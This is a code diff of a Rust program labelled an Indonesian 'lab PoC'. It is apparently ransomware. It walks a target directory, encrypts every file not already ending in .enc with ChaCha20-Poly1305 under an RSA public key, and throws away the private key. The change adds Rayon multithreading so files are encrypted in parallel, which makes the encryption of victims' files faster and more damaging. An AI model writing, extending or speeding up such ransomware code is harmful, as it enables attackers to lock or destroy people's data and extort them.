@@ -1,11 +1,12 @@
 // Author: sdev
-// Lab PoC dengan Local Web Server (Accessible via Public/LAN)
+// Lab PoC dengan Local Web Server (Accessible via Public/LAN + Multithreading Rayon)
 
 use chacha20poly1305::{
     aead::{Aead, KeyInit},
     ChaCha20Poly1305, Nonce,
 };
 use rand::RngCore;
+use rayon::prelude::*; // Diperlukan untuk parallel iteration
 use rsa::{Oaep, RsaPrivateKey, RsaPublicKey};
 use sha2::Sha256;
 use std::fs::{self, File};
@@ -58,16 +59,22 @@ fn encrypt_file(file_path: &Path, pub_key: &RsaPublicKey) -> Result<(), Box<dyn 
 
 fn process_directory<F>(target_dir: &Path, action: F)
 where
-    F: Fn(&Path) -> Result<(), Box<dyn std::error::Error>>,
+    F: Fn(&Path) -> Result<(), Box<dyn std::error::Error>> + Sync,
 {
-    for entry in WalkDir::new(target_dir).into_iter().filter_map(|e| e.ok()) {
-        let path = entry.path();
-        if path.is_file() && !path.to_str().unwrap().ends_with(".enc") {
-            if let Err(e) = action(path) {
-                eprintln!("[-] Gagal memproses file {:?}: {}", path, e);
-            }
+    // Mengumpulkan daftar file terlebih dahulu ke dalam Vector
+    let files: Vec<PathBuf> = WalkDir::new(target_dir)
+        .into_iter()
+        .filter_map(|e| e.ok())
+        .map(|e| e.path().to_path_buf())
+        .filter(|path| path.is_file() && !path.to_str().unwrap().ends_with(".enc"))
+        .collect();
+
+    // Memproses file secara paralel menggunakan multithreading dari Rayon
+    files.par_iter().for_each(|path| {
+        if let Err(e) = action(path) {
+            eprintln!("[-] Gagal memproses file {:?}: {}", path, e);
         }
-    }
+    });
 }
 
 fn main() {
@@ -82,7 +89,7 @@ fn main() {
     println!("[+] Menghasilkan kunci RSA...");
     let (_, pub_key) = generate_rsa_keys();
 
-    println!("[+] Menjalankan enkripsi pada direktori: {:?}", target_folder);
+    println!("[+] Menjalankan enkripsi paralel pada direktori: {:?}", target_folder);
     process_directory(&target_folder, |path| {
         encrypt_file(path, &pub_key)
     });
